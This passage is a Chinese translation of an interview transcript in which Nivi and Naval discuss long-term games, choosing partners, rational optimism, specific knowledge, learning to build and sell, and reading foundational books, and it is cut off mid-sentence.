如果你不停地更换地点，你就不停地更换团队……假设你从木工行业起步，并在那里建立了一个网络。你努力工作，你试图在木工行业制造产品。然后突然出现了另一个相邻但又不同的行业，但你真的并不了解其中的任何一个人，你想要投身其中，在那里赚钱。如果你持续在工业界跳来跳去——不，实际上我需要打开一系列电动汽车加油站。——这或许有道理。这可能是最好的机会。但是每次你重置时，每次你跳出原来的网络圈时，你都将从零开始。你不知道该相信谁，而且他们也不会很容易相信你。 当然也存在短暂的行业。他们总是进进出出。政治就是一个例子，对吧？在政治上，新人正在当选。你在政治上会看到，有很多老前辈的地方，比如参议院，这里有在这个行业中已经生存很长时间的人，他们都是职业政治家。对于职业政治家有很多不利因素比如腐败。但好处是他们实际上已经完成了彼此的交易，因为他们知道另一个人将在十年之后处于相同的位置，他们将不得不继续与这些老前辈打交道，所以他们最好学会如何合作。众议院每两年都要举行一次大型选举，选出一批新的众议员，由于一直在相互竞争，几乎任何事情都没法完成。“因为我刚来到这里，我不认识你，我不知道你是否会继续在身边，我为什么要和你合作，而不是只是尝试做我认为正确的事情？” 因此选择一个你能长期从事的行业、以及长期伙伴是非常重要的。这些人会表明他们会在你身边存在很久，他们是有道德的，他们的道德信条能从他们的行动上体现出来。 长期游戏中，每个人都在让彼此更富有Nivi：在长期游戏中，似乎每个人都在让彼此更富有。而在短期游戏中，似乎每个人都在让自己更富有。 Naval：我认为这是一个很棒的形容。在长期游戏中，这是一个正和现象。就好像大家在一起烤一个苹果派，大家都在努力尽可能将它做得越大越好。在短期游戏中，我们是在想方设法分这个派。 现在这不是在为社会主义者辩解，对吗？这些社会主义者不是参与烘焙派的人，他们最后出现，说”我想要一片，或者整个派。“他们出现时是带着枪的。但是我认为一个好的领导者并不能赢得荣誉。一个好的领导者基本上都在努力激励员工，这样团队才能将工作完成。然后，奖励将按照公平原则进行划分，谁贡献了多少（或尽可能接近）并承担了风险，而不是谁拥有最长的刀…谁有最锋利的刀。 收益来自重复游戏的复利Nivi：因此，接下来的两个推文是，“玩迭代游戏。生活中的所有的回报，不论是财富上的，还是人际关系上的，或者是知识上的都来自复利效应。” Naval：当你与一个相处了十年，二十年，三十年的老友做生意时，你根本不需要信任他，事情也可以做得越来越好。因为在相处过程中摩擦逐渐减弱，你们可以一起做越来越大的事情。 举个极端的例子，最简单的方法是与某人结婚，生孩子然后养孩子，这就是复利（笑）。投资于这些长期的关系，与更随意的关系相比，这些关系最终是无价的。 在健康和健身方面也是如此。 你的身体越健康，保持健康就越容易。 而你的身体恶化的越多，就越难回到正常的水平。 第十一条： 选择智慧、精力充沛和正直的合作伙伴选择高智商、精力充沛、为人正直的伙伴是你不能妥协的三要素 选择高智商、精力和正直的商业伙伴Naval：在挑选同事方面，选择那些高智商、精力充沛、正直的人，这是你不能妥协的三个要素。 你需要和聪明的人共事，至少他们不是在错误的方向上一路向西。你需要与精力充沛的人共事，因为世界上到处都是聪明却懒惰，光想不干的人。在生活中，我们都认识一些非常聪明的人，他们可以不起床，或者动一动手指就完成很多事情。我们也知道有些人精力很旺盛，但并不聪明，他们工作非常非常努力，但有时在朝着错误的方向埋头苦干。smart不是一个贬义词。这并不是说有人聪明，有人愚蠢。我想表达的意思是，每个人在不同的事情上会表现出很聪明的一面。因此，取决于你想做什么，你才可以找到在这方面很聪明的人来帮你。 然后关于精力，很多时候人们对特定的事情没有动力，但对其他事情有动力。例如，有人可能真的没有动力一天都坐在办公室里工作。但他们可能真的有动力去画画，对吧? 嗯，那样的话，他们应该是画家。他们应该把自己的艺术放到网上，试着探索如何以此为基础建立自己的事业，而不是认命了，戴着项圈，去做一份乏味的工作。这一定是一个长期的事情，很多人在兴致勃勃的发布第一个作品后，发现没有立马收获1w+粉丝的关注而对自己大失所望，然后以此为由失去动力就放弃了。我想说的是，做一件事情的动力终究来自于你自己到底想做什么，觉得什么有意义，而不是为了讨好别人。 最后一点是正直，正直是最重要的，如果只有另外两个品质，你就选择了一个聪明、勤奋的骗子，他最终会欺骗你。所以，你必须弄清楚这个人是否正直。 我之前说过，你要通过信号判断。信号是他们做什么，而不是他们说什么。当他们认为没有人在看他们时，他们会做一些非语言的事情。 动机必须是内在的Nivi：Sam Altman之前有个有趣的观点，当谈到委任时，他说：“委任的关键在于，让人们做他们擅长同时是你想让他们做的事情。”这个道理显而易见，你会和那些自然会做你想让他们做的事情的人合作。 Naval：是的。如果我认为他们不喜欢我想让他们做的事情，我几乎不会创办公司，不会雇人，也不会和别人一起工作。 当我年轻的时候，我常常试着说服别人。但事实证明，你可以说服某人帮你做一件事，但是有时候你不能。你无法让他们保持动力。你可以在一开始就给他们灵感，但除非你是像亨利五世那样的国王，拥有那样的权力指使别人做事情。但如果你想让人们长期保持动力，这种动力必须是内在的。你不能只是创造它，如果他们没有内在的动力，你也不能成为他们的拐杖。所以，你必须确保员工精力充沛，愿意做你希望他们做的事，愿意和你一起工作，一起创造。 诚信反映在一个人的行为，而不是他说了什么解读信号非常非常重要。信号不是人们说什么，而是他们做了什么。因此，注意细微的信号是很重要的。举个例子，比如在公众场合，如果有人对服务员态度非常不好，那么他们对你不好只是时间问题。如果有人压制了一个敌人，并对他们怀恨在心，那么他们把你从朋友重新定义为敌人只是时间问题，你会感受到他们的愤怒。所以，愤怒，愤怒，报复，短视的人在现实生活中的很多互动中都是这样的。人们奇怪地一致，至少身体很诚实。所以，你想找到长期合作的伙伴，你要找的是那些似乎没有理性道德的人。 举个例子，我有一个朋友，他的公司是我投资的，但是公司接近倒闭，他本可以把所有的投资者都鸽了。但他不断地投入越来越多的个人资金，直到公司最终又站起来。在这个过程中，他从未让投资者血本无归。为此我一直很感激他。我说，“哇，你对投资人这么好真是太棒了，你没有坑他们。他觉得被冒犯了。他说：“我这样做不是为了你（投资人），是为了我自己。这关乎我的自尊，是我真正关心的东西。”这种人才是你想要共事的人。 另一个我喜欢的引用，是我另一条相关的推特。我是在别的地方读到它，但是我稍微修改了一下。 “自尊是你对自己的评价”。 好人，有道德的人，容易共事的人，可靠的人，往往有很高的自尊，因为他们对自己的声誉非常在意，他们深刻的明白声誉的重要性。 第十二条：与理性的乐观主义者合作不要与愤世嫉俗者和悲观主义者为伴：他们总是以自我为中心 不要与悲观主义者为伍Nivi：最后一条推文。你说：“不要与愤世嫉俗者和悲观主义者为伍。他们总是自以为是。 Naval：是的。本质上，要创造事物，你必须是一个理性的乐观主义者。理性的意思是你必须看清世界的真相。但你必须对自己的能力保持乐观，对自己想要完成的使命保持乐观。 我们都知道有些人总是很悲观，他们会否定一切。每个人的生活中都有乐于助人的批判者，对吧？他认为他是在帮忙，但实际上他只是在批评（就像我所说的专业的评论家），而且他对每件事都很失望。这样的人不仅在他的生活中不会成就任何伟大的事情，他们还会阻止周围的人做一些伟大的事情或有大胆的想法。他们往往享受挑刺儿的快感，但从未想过提供更好的解决问题的方案，对，他们就是只说不做。有一句经典的军事台词：“要么当头儿，要么服从，要么滚。”这些人想要第四种选择，他们不想当领导，不想跟随，但又不想让路。他们就是想方设法告诉你为什么这事儿行不通。 我认识的所有真正成功的人都有很强的行动力，他们只是做事。判断一件事是否可行的最简单方法就是去做，至少做第一步，第二步，第三步，然后再决定下一步。 因此，如果你想在生活中取得成功，创造财富，或者拥有良好的人际关系，或者保持健康，甚至是快乐，你需要有一种超强的行动力，这样才能获得你想要的。 与理性的乐观主义者合作你要对合理的东西保持乐观。众所周知，没有什么比一个鲁莽的人去追求不值得的东西更糟糕的了。这就是为什么我说“理性”的乐观主义者。你需要在了解所有的陷阱，知道事物不利的一面的情况下，依旧保持乐观。 每个人只在这个星球上活一次，为什么不试着做点大事呢？这就是埃隆·马斯克这种人的牛逼之处，我认为他之所以能激励这么多人，是因为他承担了非常、非常大胆的责任和使命。他为人们树立了一个树立远大理想的榜样。即使是做一些小东西也要花很多功夫。我不认为街角杂货店老板的工作强度比埃隆·马斯克(Elon Musk)低，也不认为他付出的汗水和辛劳比马斯克少，甚至更多。无论是教育水平还是所处环境，不管什么原因，他们没有机会去想那么多，所以影响力就不那么大。因此，最好还是想得远一点。当然还是要理性地，在你的能力范围内保持乐观。 愤世嫉俗者和悲观主义者，他们真正想说的是，这很不幸，但他们基本上是在说，“我放弃了。我想我什么都做不了。所以对我来说，这个世界就像一个没有人能做任何事的世界。”所以他们不理解别人为什么费劲儿地要去做一些事情。 我们是悲观主义者的后代Nivi：也许做一个不理性的乐观主义者或做一个理性的愤世嫉俗者可能更好。 Naval：对于为什么你应该成为一个乐观主义者，有一个完全理性的框架。历史上，如果你回到2000年，5000年，10000年，两个人在丛林中漫步，他们听到了老虎的声音。一个是乐观主义者，说，“哦，它不是朝我们这边来的。另一个说：“我是个悲观主义者，我要离开这里。”悲观的人跑了，活了下来，乐观的人被吃掉了。 我们是悲观主义者的后代，我们天生就是悲观主义者。但现代社会要安全得多，没有老虎在街上游荡，虽然你应该避免彻底破产，但你最终不太可能一无所有。 我想分享的理念是，对于一个人来说，他的境遇是有下限的，但上限却很难说（白话说是你很难饿死，但是成功却不可限量）。因此，适应现代社会意味着要克服你的悲观情绪，做出稍微不理性的乐观押注，因为如果你创办下一个SpaceX、特斯拉(Tesla)或优步(Uber)，你可以为社会和自己创造数十亿美元的价值，并改变世界。 “如果你失败了，有什么大不了的？你损失了几百万美元的投资人（VC）的钱，而他们还有更多钱，这就是他们对你成功的赌注。” 对过去悲观是有道理的，对今天保持乐观是有意义的，尤其对于这么多受过高等教育且生活在第一世界国家的人，甚至是第三世界国家的人。我反而认为第三世界国家的经济机会要大得多。 当然，你必须注意的一件事就是，不要做任何违法的事情，远离可能会带来灾难性的损失的事。尽可能不做对身体有害的事情，注意你的健康。远离那些会让你失去所有资本和储蓄的事情。 因此，不要孤注一掷。但理性乐观的押注会带来巨大的好处。 第十三条：用特殊技能（Specific knowledge）武装自己Naval：如果你想变得富有，你需要想办法获得“规模化”的收入，而不是仅仅期盼每个月的工资。责任感决定了你的客户为什么选择你，杠杆效应决定了它可以被规模化。为什么大家要付给你钱而不是给别人，这需要特殊的技能。这里提到的特殊技能可能是整个推特风暴中最难传达的东西，也是人们可能最困惑的部分。 人们普遍持有一种观点是，任何事情都可以从学校学来，都可以“被传授”，但事实上最有价值的事情不是教来的。但好在任何事情都可以学，大部分情况下你想学的东，要么来源于你的兴趣或DNA，要么是源于你从小养成的一些习惯，这些在之后非常难被“教”会；当然也可能是一些全新的东西，所以没有人知道怎么做；或者在工作培训中也是如此，你在高度复杂的环境中进行各种尝试，在一个特定的领域建立判断。典型的例子就是投资，但也可以是其他方面。可以是开拖拉机的技巧，也可以是预测天气的能力。 因此特殊技能就是你特别关注的技能，尤其是你已经到了20、21、22之后，你几乎就不用去选你需要什么样的特殊技能了。你需要做的就是回顾之前的人生经历中，你建立了什么样的技能是你觉得可以着重被发展的。 特殊技能无法被训练出来特殊技能不是教出来的。如果学校可以教这些东西，那么其他人也可以接受培训，然后我们就可以大规模生产和大规模培训人员。我们甚至可以编程让电脑来做，让机器人来做。如果是这样的话，你就很容易被替代。当有无数的人可以经过培训做这件事的时候，雇主支付给你的只是最低工资，为的就是让你做“这件事”。你获得的收入=投资培训所产生的回报-培训你的成本。 特殊技能与你的兴趣高度相关举个例子，一个人拿到了心理学学位后，成为了一名销售人员。如果他已经拥有比较好的销售技巧，那么心理学就可以作为一种杠杆，使他在销售上做得更好。但如果他一直是一个内向的人，从来都不擅长销售，他们试图用心理学来学习销售，他们不会做得很好。因此，你会发现更多的特殊技能是通过认识到你的天赋、你真正的好奇心和你的热情而建立起来的。不是为了最热门的工作去上学，也不是盲目进入投资人认为的最热门的领域创业。 特殊技能往往处于知识的边缘它也是一些刚刚被发现或者很难被发现的东西。因此，如果你不是100%的投入，其他人会比你做得更好。他们不会比你好一点点，他们会比你好很多，因为现在我们正在运营创意领域，非常适用于复利，适用于杠杆。如果你的杠杆率为1000倍，有人在80％的时间都是正确的，而其他人在90％的时间都是正确的，那么90％的时间正确的人将因为市场的杠杆作用和复利获得数百倍的报酬。因此，如果你想确保自己在这方面具有优势，真正具有好奇心非常重要。 建立特殊技能对你来说就像游戏很多时候，它不是你坐下来然后推理的东西，它更多的是通过观察发现的。你几乎不得不回顾自己的生活，看看自己到底擅长什么。例如，我想成为一名科学家，所以我所坚持的价值观都是围绕着「科学家」来建立的。我认为真正的科学家处于人类生产链条的顶端，他们做出了真正的突破和贡献，对人类社会的贡献可能比任何其他阶层的人都要大。当然，我并不是说艺术、政治、工程或商业等贡献小，但如果没有科学，我们仍然会在泥土中挣扎，用棍子打架，每天忙着生火。我的整个价值体系都是围绕着科学家建立的，我想成为一名伟大的科学家。 但当我真正回头看我擅长的东西，以及我最终把时间花在了什么事情上时，我发现更多的是围绕着赚钱，钻研技术，卖东西（思想），解释事情，和人们交谈。所以，我有一些销售技巧，这是一种形式的具体知识；我有一些关于如何赚钱的分析技巧；我对数据足够敏感，有收集数据，整理并分析数据的能力，这也是我的一个特殊技能。当然我也喜欢摆弄技术。所有这些对我来说都像是游戏，但对其他人来说却是工作。 有些人会觉得这些事情很难，他们会说，“好吧，我怎么才能变得善于表达和推销想法呢?”如果你不是很擅长，或者你不是很喜欢，也许这不是你的专长，专注于你真正喜欢的事情。 有点讽刺的是，第一个指出我真正擅长什么的人是我的母亲。她是在厨房里说这些话的，当时我大概15、16岁。当我在和一个朋友说我想成为一名天体物理学家，她说：“不，你更适合去经商。” 我一脸懵逼，“啥？我妈妈不知道她在说什么吧。” 但事实上，妈妈当然知道她在说什么。她已经注意到，每次我们走在街上，我都会批评当地的披萨店，为什么他们要用特定的配料和特定的方式出售披萨，为什么他们点披萨的过程是这样的，而实际上应该是那样的。因此，她知道我对商业更有好奇心，到后来与我对科学的痴迷结合起来，创造了技术和科技企业，我才发现了真正的自己。因此，你的特殊技能可能是由那些了解你的人观察到的，而且经常是由那些了解你的人观察到的。 第十四条：特殊技能（specific knowledge）极富创造性或技术性特殊技能能通过课程传授获得Naval: 如果说特殊技能可以被传授，那就是在工作中，通过学徒制。这就是为什么最好的企业、最好的职业是学徒或自学的职业，因为这些都是社会还没有弄清楚如何培训以及使其批量自动生产的事情。这方面的经典例子是沃伦·巴菲特从学校毕业后去找了本杰明·格雷厄姆。本杰明·格雷厄姆（Benjamin Graham）是《聪明的投资者》（Intelligent Investor）一书的作者，可以说他将价值投资发展成了一套理论并将其发扬光大。巴菲特去找了本杰明·格雷厄姆，并主动提出免费为他工作。 但格雷厄姆说：“你开的价格太高了，免费恰恰是一种高价格。”格雷厄姆说得没错。就像后来1954年时格雷厄姆决定要与巴菲特共事时（给予他学徒机会），巴菲特给他多少钱都不为过。 特殊的技能具有高度的创造性或者技术性特定的技能也往往具有技术性和创造性。它在技术的前沿，艺术的前沿，交流的前沿。再举个例子，在今天，互联网上有一些梗王能够创造出令人难以置信的梗，并将这一想法传播给数百万人。斯科特·亚当斯（Scott Adams）就是一个很好的例子，他通过有说服力的文字和视频做出准确的预测，基本上正在成为世界上最可信的人之一。 这是他多年来积累起来的特殊技能，因为他年轻时就沉迷于催眠，他通过漫画学会了如何沟通，并很早就开始用直播平台Periscope，所以他一直在练习和人对话，他读过所有关于这个话题的书，他将工作融入到生活的点点滴滴。 这是一个在职业生涯中积累了特殊技能的人的例子。它具有高度的创造性，它具有技术性的元素，而且它永远不会被机器自动化所取代。没有人会把这一点从他身上夺走，因为斯科特·亚当斯（Scott Adams）为了发展自己的品牌也尽心尽力。他积极地创作Dilbert系列卡通画、写书，并懂得借助Periscope直播平台的媒体优势运作。他在这个品牌上拥有巨大的影响力，如果他想在现有的基础上创造更多的财富，他现在积累的东西就他的杠杆。 特殊的技能特定于个体和情境Nivi：我们应该称之为独特的知识还是特殊的技能更贴切？ Naval： 我很小的时候就提出了这个框架，当时特殊的技能就一直伴随着我，我没有尝试改变它是因为我所发现的每一个术语都以不同的方式夸大其词。至少特殊的技能（specific knowledge）这个词没被过度消费，因此我可以赋予他新的含义。独特知识的问题是，是的，也许它是独一无二的，但是如果我从别人那里学到它，它就不再是独一无二的，那么就是我们都知道的东西了。所以，与其说它是独一无二的，不如说它是高度依附于现实的，根据个体的实际情况，根据具体问题存在的，它只能依赖于在这个领域中极度的痴迷、兴趣和所花在这个领域的时间来获得。它不能仅仅从一本书中直接读出，也不能在只在一门课程中获得，也不能被设计成一个算法。 特殊技能不能刻意获得Nivi：说到斯科特·亚当斯，他在博客上发表过一篇文章叫做「努力在2个或以上的领域做到前25%」的文章。在此摘录一段： 如果你想要一个普通的成功的生活，不需要太多的计划。只要远离麻烦，去上学，申请你可能喜欢的工作。但如果你想要与众不同的东西，你有两条路: 成为某方面的最牛逼的人（世界第一梯队） 在两件或两件以上的事情上变得非常优秀(前25%)。 第一种策略几乎是不可能的。很少有人能在NBA打球，也很少有人能出一张白金唱片。真的很难，我不建议任何人去尝试。 第二种策略相当简单。每个人都至少有几个领域是他们可以努力进入前25%的。就我而言，我比大多数人画得都好，但我算不上艺术家。我并不比一般的单口相声演员更幽默，虽然我从来没有成功过，但我比大多数人都更幽默。神奇的是，很少有人能画得很好，也很少有人能写笑话。正是这两者的结合，让我的作品变得如此罕见。当你再加上我的商业背景，我突然有了一个很少有漫画家不亲身经历就能理解的话题。 我总是建议年轻人成为优秀的演说家(前25%)。任何人都可以通过练习来做这件事。如果你把这种才能加到其他任何一种才能上，你就会突然成为那些只有一种才能的人的老板。或者在你的工程学位、法律学位、医学学位、科学学位或其他任何学位的基础上再获得一个商学学位。突然之间，你掌握了主动权，或者你正在利用自己的综合知识创办自己的公司。 因此，不要试图在一件事情上做到最好，这太难了。你需要尝试在三件或更多的事情上做到非常优秀。这是一种获得特殊技能的方式吗？ Naval：我认为最好的方法就是追随自己的内心真正喜欢的事物。在你脑海的某个角落，你会意识到，事实上，这个方面我喜欢，我会留意它的商业方面的可能性。 但我认为，如果你单单为了获得「特殊技能」无病乱投医，或过于以目标为导向地关注钱，那么你不会选择做正确的事情，不会选择你喜欢做的事，所以你不会真正深入进去。根据统计数据，斯科特・亚当斯的观察结果很准。就知识而言，今天有 10,000 个对人类有价值的区域，这 10,000 个区域中排名第一那些位置已经被抢占了。除非你碰巧成为各种领域最痴迷的一万人之一，否则其他人可能会成为这万人中的第一人。 当你开始把3728种一流的销售技巧和很好的写作技巧以及一个非常了解会计和财务的人结合起来，当这个交叉点的需求到来时，你已经通过组合数学从10000扩展到了数百万或数千万。所以，它只是变得没有竞争力。此外，收益在递减。因此，在三四件事上成为前25%要比在某件事上成为世界第一容易得多。 在你擅长得领域建立自己的特殊技能natural是天生的、本来的意思，这里翻译成擅长的。我认为这是一个非常务实的方法。但最重要的是，我认为一个人不要太刻意地开始积累，因为你内心其实是想挑选你最擅长的东西。每个人都有与生俱来的擅长的东西。 我们都很熟悉这句话，一个有天赋的人。“哦，这个人是天生的与人为善的人，这个人就是社交名媛的料，这个人是天生的程序员，这个人是天生的读者。”所以，不管是干什么的料，你都会想着在这方面加倍努力。 因为人类的个性非常复杂，你可能在很多方面都很有天赋。如果把你在这些方面的天赋结合起来，这样你就可以自动地，仅仅通过纯粹的兴趣和享受，在很多事情上，最终达到25%，10%甚至5%的最高水平。 第十五条：学会销售，学会建造如果你两者都能做到，你将势不可挡 学会销售，学会建造Nivi：谈到技能组合，你说过你应该“学会销售（Sale），学会建造（Build），如果你两者都能做到，你将势不可挡。” Naval：这是一个非常广泛的范畴。其中之一是开发产品，即建造。这很难，而且定义很多元。它可以包括设计，开发，可以包括制造，物流，采购，甚至是设计和完成一整套服务。在每个行业，都有一个建造者的定义。在我们所处的科技行业，就是首席技术官CTO，程序员，软件工程师，硬件工程师。但即使在洗衣行业，也可能是创立洗衣服务的人，让物流准时到达的人，确保所有的衣服在正确的时间出现在正确的地方的人，等等。另一方面是销售。同样，销售也有一个非常宽泛的定义。销售不一定只意味着卖东西给个人，它可以意味着营销，意味着沟通，意味着招聘。它也可以意味着筹集资金，意味着鼓舞人心，意味着做公关，等等。 硅谷模式：建造者+销售者=最佳拍档总的来说，硅谷的创业模式是最好的。最常见的形式是有两个创始人，其中一个擅长销售（Sale），另一个擅长搭建（Build）。举几个经典例子，比如苹果创始人史蒂夫·乔布斯和史蒂夫·沃兹尼亚克；微软的盖茨和艾伦在早期可能有类似的分工；谷歌的拉里和谢尔盖可能稍微有点不同，可能是因为谷歌早期交付的是一个非常技术性的产品——搜索，通过一个简单的UI直达终端用户。 在硅谷，你会看到这种模式反复出现。一个建造者和一个销售者的组合：CTO和CEO的组合。风险投资者和技术投资者几乎心照不宣的尽可能地寻找这种组合，这就是神奇的组合定律。 如果你两者都能做到，你将势不可挡如果一个人可以同时做到这两者，这才是真正的超能力。那时你就是可以创造整个行业的人。马一龙(Elon Musk)就是一个活生生的例子。他不一定是自己造火箭，但他实际上做出了技术上的贡献。他使自己成为最了解这项技术的人，没人会对他说三道四，他也不会说一些自己做不到的事（意思是说到就会做到）。他视时间为朋友，并想尽办法运用它。即使是史蒂夫·乔布斯（Steve Jobs）也拥有足够的产品技能，并且对产品的参与度也很高，实际上他也同时具备这两种能力。拉里·埃里森（Larry Ellison）最初是一名程序员，他编写了Oracle的第一个版本，或者说他深度参与其中。马克·安德森（Marc Andreessen）也属于这一类。他可能对自己的销售技能没有足够的信心，但是他可是写出Netscape Navigator的程序员，或者至少是其中很大的一部分。因此，我认为在任何领域中真正的巨人就是可以「自产自销」的人。 宁愿教工程师销售，也不愿教营销人员工程？我认为你可以从建造技能开始入手，并在你人生的早期尽量掌握一定的建造技能。或者你有足够的时间可以专心地学习销售，而且你正好有一定的天赋和亲和力促使你成为一个好的销售者。这样你做事的效果可以翻番。现在我们谈到的销售技能可能不同于传统概念中的，卖东西。 举个例子，假设你是一个很棒的工程师，然后人们会说，你需要擅长销售。你可能不擅长上门推销东西，但你可能是一个很好的作家。写作是一种比面对面销售门槛更低的技能，所以你可以培养写作技能，直到你成为一个良好的在线交流者，然后将其运用在你的销售上。另一种情况，你可能是一个很好的建造者，但你不擅长写作，你不喜欢与大众沟通，但你擅长一对一说服，所以你可能会用你的销售技能来招聘或募资，这需要更多一对一方向的努力。 因此，如果你在这两个领域的十字路口，千万不要绝望。因为你不可能成为最好的技术，也不会是最好的销售人员。但神奇的是，我们再回到斯科特·亚当斯（Scott Adams）的技能组合理论，将两个技能是结合将是不可阻挡的。 从长远来看，那些了解潜在需求产品的人，知道如何建造和销售它的人，最能受到顶尖投资者的青睐。如果他们有足够的精力，他们可以突破任何障碍，做成任何事情。 Nivi：如果你只能选一个擅长的，你会选哪一个? Naval：抛开噪音来说，建造的技能实际上是更好的，因为市场上充斥着太多的骗子和没有任何内核的销售人员。当你刚起步、想要被认可的时候，建造技能会更好。但是之后的建造会很累，因为这是一项专注的工作，很难保持与时俱进，因为总是会有新人出现，有新产品，有更新的工具。 因此，随着时间的推移，销售技巧实际上更容易产生规模效应。比如，如果你在构建产品上享有声誉，这是好的，但当你推出你的新产品时，我将去验证的是产品本身（意思是和建造的名声关系不大）。但是，如果你在大家的眼中是一个值得信赖的生意伙伴，并且你很有说服力，善于沟通，那么这个名声会让很多事变得容易很多。 因此，我认为如果你需要选一个，你可以从建造开始，然后过渡到销售。这是一个比较中庸的答案，但我觉得这奏是大实话。 第十六条：阅读你所热爱的内容 直到你爱上阅读你应该可以在图书馆中拿起任何一本书阅读 阅读你所热爱的内容 直到你爱上阅读Nivi：在我们讨论责任、影响力和判断之前，你已经有了一些相关的推特，我会把它们放在持续学习的范畴。这些推文本质上是在说，“没有所谓的商业技能。少读商业杂志和商业课程，学习微观经济学、博弈论、心理学、说服力、伦理学、数学和计算机”。你在Periscope上还发表了另一条评论“你应该可以从容的拿起图书馆里的任何一本书来读。”这一类的最后一条推特是，“阅读比听快，做比看快”。 Naval：是的，这是最重要的一条，因为学习的基础是阅读。我认识的聪明人，他们都经常读书。 问题是，我读什么？我怎么读？因为对大多数人来说，这是一场斗争，是一件家务活儿。但是，读书不是目的，重要的是学会如何教育自己，教育自己的方法就是培养对阅读的热爱。我想说的是，“读你喜欢的内容，直到你爱上阅读。”就这么简单。 我认识的每一个经常读书的人都“爱”阅读，他们爱读书是因为他们读自己喜欢的书。这有点像第二十二条，阅读是没有门槛的，你可以随时开始，然后不断积累，直到它成为一种习惯。接着，你开始不满足于只涉猎单一的领域。 也就是说，你可以从读小说开始，接着你可以读科幻小说，你可以读非小说，然后你可以读科学，哲学，数学甚至更多。但是重要的是，这个过程是顺其自然非强迫的，读你感兴趣的东西，直到你理解它们。然后你就会自然而然地进入下一步，再下一步。 阅读某一领域的科学原著但是，你会发现在你真正想学的东西中，有太多东西要读。我要提醒的是，即使是阅读也充满了垃圾。实际上有些东西你可以阅读，特别是在早期，它会以某种方式对你的大脑进行编程，然后在你阅读的后期，你会根据之前的东西来分辨这些东西是真是假。因此，阅读基础性的东西是很重要的。基础性的东西，是在特定领域最原始（fundamental）书籍，在本质上是经过时间和历史的检验，科学的东西。 比如，与其读一本商业畅销书，不如读亚当·斯密的《国富论》。与其读今天谁写的一本关于生物学或进化论的书，我更愿意读达尔文《物种起源》。与其现在读一本可能非常先进的生物技术方面的书，我只想学习Horace F. Judson的《创世第八天》(The Eighth Day of Creation)。你不必死磕关于宇宙学和尼尔·德格拉斯·泰森和斯蒂芬·霍金一直在说什么的高级书籍，你需要的是拿起理查德·费曼的《费曼讲物理：入门》，从基础物理学开始。 不要害怕任何书如果你基础打的好，特别是数学、物理和科学，那么你就不会害怕任何一本书。我们所有人都有那种坐在教室里学数学的记忆，这一切都是合乎逻辑的，而且都是有意义的，直到有一次，课程进度太快，我们跟不上了。在那之后，我们被留下来背方程式，记忆概念，却无法从第一原理中推导出它们。在那一刻，我们迷失了，因为除非你是一个专业的数学家，否则你不会记得这些东西。你要记住的是技术，基础。 因此，你必须确保阅读是建立在一个理解的框架上，因为你正在为建摩天大楼打地基，而不只是在反复记忆你不断在丢失的东西。所以基础非常重要。 最后，阅读的终极是当你走进一个图书馆，你上下打量，你不害怕这里的任何一本书。因为你知道你可以把任何一本书从书架上拿下来，你就能阅读它，理解它，你可以接收什么是真的，拒绝什么是假的。你有一套自己的方法论，分辨哪些是逻辑和科学的，而不仅仅是基于大字报和意见（opinions）。 学习的手段是丰富的，学习的欲望是稀缺的互联网的美丽是整个亚历山大图书馆的十倍，并且时刻在你的指尖，为你所用。不是教育手段或学习手段稀缺，相反稀缺的是学习的欲望。所以，你真的要培养欲望。 欲望意味着我不允许这种能力的丧失。孩子们天生就有好奇心。如果你去找一个第一次学语言的小孩，他们总是问：这是什么？那是什么？这是为什么？那是谁？他们总是问问题。 但问题之一是，学校和我们的教育系统，甚至我们培养孩子的方式，都用顺从取代了好奇。一旦你用顺从取代好奇心，你就会成为一个顺从的工厂工人，而不再是一个创造性的思考者。你需要创造力，你需要有激励自己的大脑去学习你想要的东西的能力。 第十七条：数学和逻辑才是一切事物的基础数学和逻辑是理解其他一切事物的基础 终极基础是数学和逻辑Naval：最基本的东西是原则性的，可以是算法，是根深蒂固的逻辑理解，你可以从任何角度保护它或攻击它。这就是为什么微观经济学很重要，而宏观经济学就是大量的记忆堆砌，大量的宏观废话。 正如纳西姆•塔勒布(Nassim Taleb)所说，宏观上的扯淡比微观上的扯淡更容易。因为宏观经济学是巫术—复杂—科学与政治的结合。如今，你找不到两个宏观经济学家在任何事情上达成一致，不同的政治家会用不同的宏观经济学家来兜售他们各自偏爱的理论。 现在甚至有宏观经济学家在兜售所谓的现代货币理论，大概意思就是，有个讨厌的东西叫做通货膨胀，我们可以印所有我们想要的钱。这就像说，有了无限的能量，我们可以发射火箭进入太空一整天。这简直是一派胡言。现实是，有些人打着“宏观经济学家”的旗号，兜售什么现代货币理论，这只能说明，宏观经济学作为一门“所谓的科学”已经腐败。它现在是政治的一个分支。 因此，你要把重点放在基础上。最终一切事物的基础是数学和逻辑。如果你懂逻辑和数学，那么你就有了理解科学方法的基础。一旦你理解了科学方法，你就能理解如何在其他领域和其他你正在阅读的东西中区分真理和谬误。 速食一百本书毫无意义在阅读别人的观点（opinion）时要非常小心，甚至在阅读事实（facts）时也要小心，因为所谓的事实往往只是表面上的(伪科学)观点。你真正需要的是算法（algorithm），是理解（understanding）。最好是慢慢地啃完一本书，然后挣扎、绊倒、倒带，而不是快速地浏览一遍，然后貌似很有成就感：“我已经读了20本书，我已经读了30本书，我已经读了50本这个领域的书…”就像李小龙说的，“我不害怕那些知道一千种踢腿招式的人，我害怕那些练习了一万次出拳或一万踢腿的人。”通过不断重复和运用，不断深入理解逻辑和基础，你才能成为一个聪明的思考者。 学习讲故事和编程Nivi：要为你以后的学习打下基础，我认为你需要两样东西，总结来说。第一，练习说服别人，不断实践怎么讲好一个故事。第二，深入了解一些技术范畴的东西，无论是学习抽象数学，还是读唐纳德·克努斯关于算法的书，或者听费曼关于物理学的讲座。如果你有实际的说服力，对一些复杂的话题有深刻的理解，我认为你的余生将有一个很好的学习基础。 Naval：是的。我把它展开一下。我认为五个最重要的技能是，阅读，写作，算术，然后加上说服的技巧，也就是会讲故事（storytelling）让别人信服。最后，我还要加上计算机编程，因为它是一种应用形式的运算它能让你在任何领域都能自由的建造。如果你擅长电脑，擅长基础数学，擅长写作，擅长说服，如果你喜欢阅读，你就已经为生活做好了准备。 第十八条：没有被称为“商业”的技能避开商学院和杂志 没有被称为“商业”的实际技能Naval：没有所谓商业的实际技能，它太普通了。这就像一种叫做“关联”的技能，定义为“与人相关”。这都不能称作一种技能，它太宽泛了。 我并不想完全贬低商学院传授的东西的价值，他们会传授非常聪明的东西—一些成功的案例/轶事，并称之为“案例分析”（case 